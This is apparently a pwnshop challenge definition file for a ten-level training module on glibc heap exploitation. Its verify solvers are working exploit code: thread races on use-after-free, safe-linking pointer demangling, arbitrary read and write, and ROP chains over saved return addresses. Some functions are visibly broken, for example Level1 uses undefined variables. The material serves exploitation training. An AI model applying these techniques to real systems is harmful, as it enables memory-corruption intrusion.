import subprocess
import pwnshop
import pwn
import sys
import os

PWNSHOP_AUTOREGISTER = False

from pwnshop import Challenge, retry

class BabyPrimeBase(Challenge):
    LINK_LIBRARIES = ["pthread"]

    TEMPLATE_PATH = "babyprime/babyprime.c"

    BUILD_IMAGE = "ubuntu:22.04"
    threaded_server = True
    win_function = True

    flag_seed = True
    secret_location = None
    secret_size = 8

    functions = ["malloc", "free", "scanf", "printf", "send_flag", "quit"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.functions_description = "/".join(self.functions)

        self.secret = {
            "bss": "secret.secret",
            "thread_heap": "secret",
            "thread_stack": "secret.secret",
            "env": "secret",
            "main_heap": "secret",
        }.get(self.secret_location)

        if self.secret_size:
            # Align to 0x10 to allow safe-linking without major exploit rework
            self.secret_padding = self.random.randrange(0x20, 0xD0, 0x10)
        if self.secret_location == "thread_heap" or self.shadow_malloc:
            self.secret_padding_mallocs = self.random.randrange(8, 16 + 1)
        if self.secret_location == "main_heap":
            self.secret_padding_mallocs = self.random.randrange(5, 10 + 1)

def demangle(ptr, page_off=0):
    pos = (ptr >> 12) + page_off
    middle = pos ^ ptr
    return middle >> 24 ^ middle

def mangle(pos, ptr):
    return pos >> 12 ^ ptr

def warm_up(r, arena, depth=4):
    # Load up some tcache shit
    for i in range(depth):
        arena.sendline(f"malloc {8 + i}".encode())
    for i in range(depth):
        r.sendline(f"free {8 + i}".encode())
    r.clean()

def get_heap_leak(r1, r2, idx, page_off=-1):
    warm_up(r1, r1)
    warm_up(r2, r2)
    msg = f"scanf {idx} " + "z" * 6 + "B" * 30 + "\n"
    leak = cold_get_heap_leak(r1, r2, idx, msg)
    return demangle(leak, page_off)


# Needed for chal 10
def cold_get_heap_leak(r1, r2, idx, msg):
    print("[!] Obtaining Heap leak..")

    # Get a leak
    while True:
        # we need to win the race between free and stored=0
        pid = os.fork()
        if pid == 0:
            r1.sendline(f"free {idx}".encode())
            for _ in range(400):
                r1.sendline(f"malloc {idx} {msg} free {idx}".encode() * 10)
            sys.exit(0)
        for _ in range(800):
            r2.send(f"printf {idx}\n".encode() * 20)
        os.wait()
        a = set(r2.clean().splitlines())
        resps = list(filter(lambda x: b'NONE' not in x, a))

        for r in resps:
            leak = r.replace(b'MESSAGE: ', b'')
            # TODO: This is a dumb check
            print(r)
            if b'\x07' in leak or b'\x7f' in leak:
                leak = leak[:6]
                leak = pwn.u64(leak.ljust(8, b'\x00')) 
                return leak



def point_allocation(r1, r2, addr, idx, heap_leak, page_off=-1):
    print("[!] POINTING ALLOCATION TO %#x" % addr)
    assert pwn.p64(addr)

    heap_page_offset = page_off * 0x1000
    mangled_addr = mangle(heap_leak + heap_page_offset, addr)
    assert not (set(pwn.p64(mangled_addr)) & {0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20})

    msg = f"scanf {idx} ".encode() + pwn.p64(mangled_addr) + b"\n"

    # Now we are trying to overwrite the freed next ptr with a mangled value
    while True:
        # we need to win the race between free and stored=1
        pid = os.fork()
        if pid == 0:
            for _ in range(10000):
                r1.sendline(f"malloc {idx} free {idx}".encode())
            sys.exit(0)
        for _ in range(3000):
            r2.send(msg * 100)

        os.wait()

        # now if we allocate it and the next pointer matches our address, we should be good
        r1.sendline(f"malloc {idx}".encode())
        r1.sendline(f"printf {idx}".encode())
        r1.recvuntil(b"MESSAGE: ")
        stored = pwn.u64(r1.readline()[:-1].ljust(8, b'\x00'))

        print(f"STORED: {hex(stored)}")
        print(f"GOAL: {hex(mangled_addr)}")
        if stored == mangled_addr:
            break
        r1.sendline(f"free {idx}".encode())

    r1.sendline(f"malloc {idx}".encode())
    r2.sendline(f"free {idx}".encode())
    r2.clean()
    r1.clean()
    # For whatever reason... this is stubborn and it isn't
    # time based so let's just spam it since it ignores
    # future requests
    for _ in range (20):
        r1.sendline(f"malloc {idx}".encode())
        r1.clean()

def arbitrary_read(r1, r2, addr, idx, heap_leak, page_off=-1):
    point_allocation(r1, r2, addr, idx, heap_leak, page_off=page_off)
    r1.sendline("printf %d" % idx)
    r1.readuntil("MESSAGE: ")
    leak = r1.readline()[:-1]
    print("LEAK:", leak)
    return pwn.u64(leak.ljust(8, b"\0"))

def arbitrary_write(r1, r2, addr, idx, heap_leak, val, page_off=-1):
    assert not (set(val) & {0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20})
    point_allocation(r1, r2, addr, idx, heap_leak, page_off=page_off)
    r1.sendline("scanf %d " % idx)
    r1.sendline(val)
    r1.clean()

def leak_perthread_addr(r1, r2):
    with ezmp.background_ctx() as bg:
        while True:
            r1.sendline("malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0" * 0x1000)
    while True:
        r2.sendline("printf 0 " * 0x1000)
        data = r2.clean()
        if b"\x7f" in data:
            break
    bg.terminate()

    # clean the tcache
    r1.sendline("free 0")
    r2.sendline("malloc 0")

    r1.clean()
    r2.clean()

    data = next(line for line in data.splitlines() if b"\x7f" in line)
    leak = pwn.u64(data[-8:])

    print("PERTHREAD:", hex(leak))

    return leak

class BabyPrimeLevel1(BabyPrimeBase):
    ""
    PIE = False

    secret_location = "bss"

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            secret_addr = process.elf.symbols["secret"] + self.secret_padding
            print(f'secret_addr: {hex(secret_addr)}')
            r1 = pwn.remote('localhost', 1337, level='fatal')
            r2 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r1, r1)
            warm_up(r2, r2)


            msg = f"scanf {idx} " + "z" * 6 + "B" * 30 + "\n"
            leak = cold_get_heap_leak(r1, r2, idx, msg)
            return demangle(leak, page_off)

            heap_leak = get_heap_leak(r1, r2, 1)
            print(f"[!] Heap leak: {hex(heap_leak)}")
            leak = arbitrary_read(r1, r2, secret_addr, 1, heap_leak)

            r1.sendline(b"send_flag " + pwn.p64(leak))
            assert self.flag in r1.clean(3)


class BabyPrimeLevel2(BabyPrimeBase):
    ""
    secret_location = "thread_heap"

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            r1 = pwn.remote('localhost', 1337, level='fatal')
            r2 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r1, r1)
            warm_up(r2, r2)
            heap_leak = get_heap_leak(r1, r2, 1, -1)
            print(f"[!] Heap leak: {hex(heap_leak)}")

            # I don't know why this magic constant works, but it does
            # it should be something like -> secret_addr = heap_leak - 0x4b0 + ((self.secret_padding_mallocs + 1) * 0x20)
            secret_addr = heap_leak - 0x430 

            leak = arbitrary_read(r1, r2, secret_addr, 1, heap_leak)

            r1.sendline(b"send_flag " + pwn.p64(leak))
            assert self.flag in r1.clean(3)

class BabyPrimeLevel3(BabyPrimeBase):
    ""
    secret_location = "thread_stack"

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            r1 = pwn.remote('localhost', 1337, level='fatal')
            r2 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r1, r1)
            warm_up(r2, r2)
            heap_leak = get_heap_leak(r1, r2, 1, -1)
            print(f"[!] Heap leak: {hex(heap_leak)}")

            libc_ptr_addr = heap_leak - 0xaa0
            print(f"[!] libc ptr addr: {hex(libc_ptr_addr)}")
            libc_ptr = arbitrary_read(r1, r2, libc_ptr_addr, 1, heap_leak)
            print(f"[!] libc ptr : {hex(libc_ptr)}")

            libc_base = libc_ptr - 0x219c80
            secret_addr = libc_base - 0x1800 + self.secret_padding
            secret = arbitrary_read(r2, r1, secret_addr, 0, heap_leak)

            r1.sendline(b"send_flag " + pwn.p64(secret))
            assert self.flag in r1.clean(3)



class BabyPrimeLevel4(BabyPrimeBase):
    ""
    secret_location = "bss"


    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            r1 = pwn.remote('localhost', 1337, level='fatal')
            r2 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r1, r1)
            warm_up(r2, r2)
            heap_leak = get_heap_leak(r1, r2, 1, -1)
            print(f"[!] Heap leak: {hex(heap_leak)}")

            libc_ptr_addr = heap_leak - 0xaa0
            print(f"[!] libc ptr addr: {hex(libc_ptr_addr)}")
            libc_ptr = arbitrary_read(r1, r2, libc_ptr_addr, 1, heap_leak)
            print(f"[!] libc ptr : {hex(libc_ptr)}")
            libc_base = libc_ptr - 0x219c80


            bin_leak_addr = libc_ptr - 0x21b9d0
            bin_leak = arbitrary_read(r2, r1, bin_leak_addr, 0, heap_leak)
            print(f"[!] bin ptr : {hex(bin_leak)}")

            elf = process.elf
            elf.address = bin_leak - 0x31a1
            print("BIN BASE:", hex(elf.address))
    
            secret_addr = elf.symbols["secret"] + self.secret_padding
            print("SECRET ADDRESS:", hex(secret_addr))

            # Problem... everything is fucked
            # solution: new tcache!

            r3 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r3, r3)
            r3.clean()
            r4 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r4,r4)
            r4.clean()
            heap_leak2 = get_heap_leak(r3, r4, 6, -1)
            print(f"[!] Heap leak: {hex(heap_leak2)}")

            secret = arbitrary_read(r3, r4, secret_addr, 6, heap_leak2)
            r3.sendline(b"send_flag " + pwn.p64(secret))
            assert self.flag in r3.clean(3)



class BabyPrimeLevel5(BabyPrimeBase):
    ""
    secret_location = "env"

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs, env={}) as process:
            r1 = pwn.remote('localhost', 1337, level='fatal')
            r2 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r1, r1)
            warm_up(r2, r2)
            heap_leak = get_heap_leak(r1, r2, 1, -1)
            print(f"[!] Heap leak: {hex(heap_leak)}")

            libc_ptr_addr = heap_leak - 0xaa0
            print(f"[!] libc ptr addr: {hex(libc_ptr_addr)}")
            libc_ptr = arbitrary_read(r1, r2, libc_ptr_addr, 1, heap_leak)
            print(f"[!] libc ptr : {hex(libc_ptr)}")
            libc_base = libc_ptr - 0x219c80

            # Note, we cannot use libc environ in this libc version ;)

            environ_addr_chain = libc_ptr + 0x1240
            print(f"CHAIN BEGIN: {hex(environ_addr_chain)}")
            leak1 = arbitrary_read(r2, r1, environ_addr_chain, 0, heap_leak)
            print(f"LEAK1: {hex(leak1)}")

            # Problem... everything is fucked
            # solution: new tcache!

            r3 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r3, r3)
            r3.clean()
            r4 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r4,r4)
            r4.clean()
            heap_leak2 = get_heap_leak(r3, r4, 6, -1)
            print(f"[!] Heap leak: {hex(heap_leak2)}")

            leak2 = arbitrary_read(r3, r4, leak1, 2, heap_leak2)
            print(f"LEAK2: {hex(leak2)}")

            secret = arbitrary_read(r4, r3, leak2 + 0x10, 2, heap_leak2)
            print("SECRET:", hex(secret))
            r3.sendline(b"send_flag " + pwn.p64(secret))
            assert self.flag in r3.clean(3)


class BabyPrimeLevel6(BabyPrimeBase):
    ""
    secret_location = "main_heap"

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            r1 = pwn.remote('localhost', 1337, level='fatal')
            r2 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r1, r1)
            warm_up(r2, r2)
            heap_leak = get_heap_leak(r1, r2, 1, -1)
            print(f"[!] Heap leak: {hex(heap_leak)}")

            libc_ptr_addr = heap_leak - 0xaa0
            print(f"[!] libc ptr addr: {hex(libc_ptr_addr)}")
            libc_ptr = arbitrary_read(r1, r2, libc_ptr_addr, 1, heap_leak)
            print(f"[!] libc ptr : {hex(libc_ptr)}")

            libc_base = libc_ptr - 0x219c80

            heap_leak_addr = libc_ptr + 0x60
            heap_base_leak = arbitrary_read(r2, r1, heap_leak_addr, 0, heap_leak) - 0x530 - ((self.secret_padding_mallocs + 1) * 0x20)
            print(f"[!] heap base ptr : {hex(heap_base_leak)}")

            secret_addr = heap_base_leak + 0x280 + ((self.secret_padding_mallocs + 1) * 0x20)
            
            # Problem... everything is fucked
            # solution: new tcache!

            r3 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r3, r3)
            r3.clean()
            r4 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r4,r4)
            r4.clean()
            heap_leak2 = get_heap_leak(r3, r4, 6, -1)
            print(f"[!] Heap leak: {hex(heap_leak2)}")

            print(f"SECRET_ADDR: {hex(secret_addr)}")
            secret = arbitrary_read(r3, r4, secret_addr, 2, heap_leak2)
            print(f"SECRET: {hex(secret)}")

            r3.sendline(b"send_flag " + pwn.p64(secret))
            assert self.flag in r3.clean(3)


class BabyPrimeLevel7(BabyPrimeBase):
    ""
    win_function = False
    functions = ["malloc", "free", "scanf", "printf", "quit"]

    # This is a lame hack to shift the challenge saved_rbp off 0x20
    run_thread_padding = True

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            r1 = pwn.remote('localhost', 1337, level='fatal')
            r2 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r1, r1)
            warm_up(r2, r2)
            heap_leak = get_heap_leak(r1, r2, 1, -1)
            print(f"[!] Heap leak: {hex(heap_leak)}")

            libc_ptr_addr = heap_leak - 0xaa0
            print(f"[!] libc ptr addr: {hex(libc_ptr_addr)}")
            libc_ptr = arbitrary_read(r1, r2, libc_ptr_addr, 1, heap_leak)
            print(f"[!] libc ptr : {hex(libc_ptr)}")

            libc_base = libc_ptr - 0x219c80

            libc = process.elf.libc
            libc.address = libc_base

            # TODO: don't yolo the offset
            # Thread 2's challenge frame saved rip
            saved_return_addr = libc_base - 0x1208
            saved_rbp = saved_return_addr - 8
            str_a = next(libc.search(b'longjmp\x00'))
            sendfile = libc.symbols["sendfile"]

            print("SAVED RETURN ADDR:", hex(saved_return_addr))
            print("str_a:", hex(str_a))

            payload = b'a' * 8
            assert not (set(pwn.p64(str_a)) & {0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20})
            rop = pwn.ROP(libc, badchars=b"\x09\x0a\x0b\x0c\x0d\x0e\x20")
            rop.call("open", [str_a, 0])
            rop.call("read", [8, libc_ptr_addr, 64])
            rop.call("sleep", [100])

            payload += rop.chain()

            arbitrary_write(r2, r1, saved_rbp, 4, heap_leak, payload)
            r1.clean()

            r1.sendline("quit")
            r2.sendline("printf 1")
            assert self.flag in r2.clean(1)



class BabyPrimeLevel8(BabyPrimeBase):
    ""
    win_function = False
    functions = ["malloc", "free", "scanf", "printf", "quit"]
    early_exit = True
    run_thread_padding = True

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            r1 = pwn.remote('localhost', 1337, level='fatal')
            r2 = pwn.remote('localhost', 1337, level='fatal')
            warm_up(r1, r1)
            warm_up(r2, r2)
            heap_leak = get_heap_leak(r1, r2, 1, -1)
            print(f"[!] Heap leak: {hex(heap_leak)}")

            libc_ptr_addr = heap_leak - 0xaa0
            print(f"[!] libc ptr addr: {hex(libc_ptr_addr)}")
            libc_ptr = arbitrary_read(r1, r2, libc_ptr_addr, 1, heap_leak)
            print(f"[!] libc ptr : {hex(libc_ptr)}")

            libc_base = libc_ptr - 0x219c80

            libc = process.elf.libc
            libc.address = libc_base

            # TODO: don't yolo the offset
            # Thread 2's challenge frame saved rip
            saved_return_addr = libc_base - 0x1668
            saved_rbp = saved_return_addr - 8
            str_a = next(libc.search(b'longjmp\x00'))
            sendfile = libc.symbols["sendfile"]

            print("SAVED RETURN ADDR:", hex(saved_return_addr))
            print("str_a:", hex(str_a))

            payload = b'a' * 8
            assert not (set(pwn.p64(str_a)) & {0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20})
            rop = pwn.ROP(libc, badchars=b"\x09\x0a\x0b\x0c\x0d\x0e\x20")
            rop.call("open", [str_a, 0])
            rop.call("read", [8, libc_ptr_addr, 64])
            rop.call("sleep", [100])
            payload += rop.chain()

            arbitrary_write(r2, r1, saved_rbp, 4, heap_leak, payload)
            r1.clean()

            r1.sendline("quit")
            r2.sendline("printf 1")
            assert self.flag in r2.clean(1)


class BabyPrimeLevel9(BabyPrimeBase):
    ""
    win_function = True
    early_exit = True

    secret_location = "thread_heap"

    pre_free = True
    shadow_malloc = True
    shadow_malloc_count = 1

    def verify(self, **kwargs):

        """
        TBD
        """
        for i in range(17):
            try:
                with self.run_challenge(**kwargs) as process:
                    r1 = pwn.remote('localhost', 1337, level='fatal')
                    r1.clean(1)
                    r2 = pwn.remote('localhost', 1337, level='fatal')

                    r1.sendline("malloc 1")
                    r1.recvuntil(" of size ")
                    dist1 = int(r1.recvline()[:-1], 16)
                    r1.sendline("malloc 2")
                    r1.recvuntil(" of size ")
                    dist2 = int(r1.recvline()[:-1], 16)
                    r1.sendline("free 2")
                    r1.sendline("free 1")

                    shift = (dist1 + dist2) >> 12
                    shift = shift + 1 # assuming  a carry

                    r1.clean()
                    r2.clean()
                    leak = cold_get_heap_leak(r1, r2, 1, "")

                    m = ((leak >> 12 ) + shift) ^ leak
                    broken_demangled_leak = (m >> 24 ^ m)
                    # It doesn't matter if the lsb of this are off,
                    # We are using this as a pos value ( >> 12)

                    r1.sendline("malloc 1")
                    r1.sendline("malloc 2")
                    r1.clean()
                    r1.sendline("free 1")
                    r1.sendline("free 2")

                    r1.clean()
                    r2.clean()
                    leak2 = cold_get_heap_leak(r1, r2, 1, "")
                    demangled_leak2 = broken_demangled_leak >> 12 ^ leak2
                    print(f"leaked heap ptr: {hex(demangled_leak2)}")

                    secret_addr = demangled_leak2 + 0x410
                    print(f"secret_addr: {hex(secret_addr)}")

                    
                    leak = arbitrary_read(r1, r2, secret_addr, 1, demangled_leak2, page_off=i)

                    r1.sendline(b"send_flag " + pwn.p64(leak))
                    assert self.flag in r1.clean(3)
                    break
            except (BrokenPipeError, EOFError):
                continue




class BabyPrimeLevel10(BabyPrimeBase):
    ""
    win_function = False
    functions = ["malloc", "free", "scanf", "printf", "quit"]
    early_exit = True

    shadow_malloc = True
    shadow_malloc_count = 3
    delete_flag = True
    true_random = True

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            # r3 connects to get the flag read in, then we leave it alive
            r1 = pwn.remote('localhost', 1337, level='fatal')
            r1.clean(1)
            r2 = pwn.remote('localhost', 1337, level='fatal')

            r1.sendline("malloc 10")
            r1.sendline("malloc 11")
            r1.clean()
            r2.sendline("free 10")
            r2.sendline("free 11")
            r2.clean()

            pos_leak = cold_get_heap_leak(r1, r2, 1, "")
            print(f"pos_leak {hex(pos_leak)}")

            assert pos_leak != 0
            assert len(hex(pos_leak))  == 11

            r1.clean()
            r1.sendline("malloc 1")
            r1.sendline("malloc 2")
            r2.sendline("free 2")
            r2.sendline("free 1")
            r2.clean(1)

            ptr_leak = cold_get_heap_leak(r1, r2, 1, "")
            print(f"ptr_leak {hex(ptr_leak)}")
            
            # We can't just arb read the flag because it is > 8 bytes in length
            heap_base = pos_leak << 12 & ~0xFFFFFF
            print(f"heap_base {hex(heap_base)}")

            libc_ptr_addr = heap_base + 0x08a0


            r2.sendline("malloc 12")
            r2.clean()
            r1.sendline("free 12")

            print(f"libc_ptr_addr {hex(libc_ptr_addr)}")
            point_allocation(r1, r2, libc_ptr_addr, 1, pos_leak << 12, page_off=0)
            r1.sendline("printf 1")
            r1.recvuntil("MESSAGE: ")
            libc_ptr = pwn.u64(r1.recvline()[:-1].ljust(8, b'\x00'))
            print(f"libc_ptr {hex(libc_ptr)}")

            libc_base = libc_ptr - 0x219c80
            print(f"libc_base {hex(libc_base)}")

            main_heap_ptr_addr = libc_base + 0x219ce0
            print(f"main_heap_ptr_addr {hex(main_heap_ptr_addr)}")

            r2.sendline("malloc 2")
            r2.sendline("malloc 3")
            r2.clean()
            r1.sendline("free 2")
            r1.sendline("free 3")
            r1.clean()

            main_heap_ptr = arbitrary_read(r1, r2, main_heap_ptr_addr, 2, pos_leak << 12, page_off=0)
            print(f"main_heap_ptr {hex(main_heap_ptr)}")
            main_heap_base = main_heap_ptr - 0x530

            stack_ptr_addr = main_heap_base + 0x02b0


            r2.sendline("malloc 3")
            r1.sendline("malloc 4")
            r2.clean()
            r1.clean()
            r1.sendline("free 4")
            r1.sendline("free 3")
            r1.clean()
            stack_ptr = arbitrary_read(r1, r2, stack_ptr_addr, 3, pos_leak << 12, page_off=0)

            r2.sendline("malloc 4")
            r1.sendline("malloc 5")
            r2.clean()
            r1.clean()
            r1.sendline("free 5")
            r1.sendline("free 4")
            r1.clean()

            bin_ptr_addr = stack_ptr - 0x328
            bin_ptr = arbitrary_read(r1, r2, bin_ptr_addr, 4, pos_leak << 12, page_off=0)


            if self.walkthrough:
                bin_ptr_base = bin_ptr - 0x1e78
            else:
                bin_ptr_base = bin_ptr - 0x1e51

            e = process.elf
            e.address = bin_ptr_base

            r2.sendline("malloc 5")
            r1.sendline("malloc 6")
            # We need to malloc to get a pointer in the bss to point here
            r2.clean()
            r1.clean()
            r1.sendline("free 6")
            r1.sendline("free 5")
            r1.clean()

            ff_adj_addr = e.symbols['ff_struct'] + 0x10 + 0x10

            print(f"Flag file: {hex(e.symbols['ff_struct'] + 0x10)}")

            flag_file_adj = arbitrary_read(r1, r2, ff_adj_addr, 5, pos_leak << 12, page_off=0)

            r2.sendline("malloc 6")
            r1.sendline("malloc 7")
            r2.clean()
            r1.clean()
            r1.sendline("free 7")
            r1.sendline("free 6")
            r1.clean()
            flag_file = arbitrary_read(r1, r2, e.symbols['ff_struct'] + 0x10, 6, pos_leak << 12, page_off=0)


            true_flag_file = flag_file_adj & ~ 0xFFFFFF | flag_file + 0x1e0
            r2.sendline("malloc 8")
            r1.sendline("malloc 9")
            r2.clean()
            r1.clean()
            r1.sendline("free 9")
            r1.sendline("free 8")
            r1.clean()
            # Alternatively, you could de-ref the buffer ptr itself
            r2.sendline("malloc 0")
            arbitrary_write(r1, r2, e.symbols['messages'], 8, pos_leak << 12, pwn.p64(true_flag_file), page_off=0)

            r1.clean()
            r1.sendline("printf 0")

            out = r1.clean(1)
            print(out)
            assert self.flag in out



LEVELS = [
    BabyPrimeLevel1,
    BabyPrimeLevel2,
    BabyPrimeLevel3,
    BabyPrimeLevel4,
    BabyPrimeLevel5,
    BabyPrimeLevel6,
    BabyPrimeLevel7,
    BabyPrimeLevel8,
    BabyPrimeLevel9,
    BabyPrimeLevel10,
]
NUM_TESTING=1
DOJO_MODULE="exploitation2"
pwnshop.register_challenges(LEVELS)
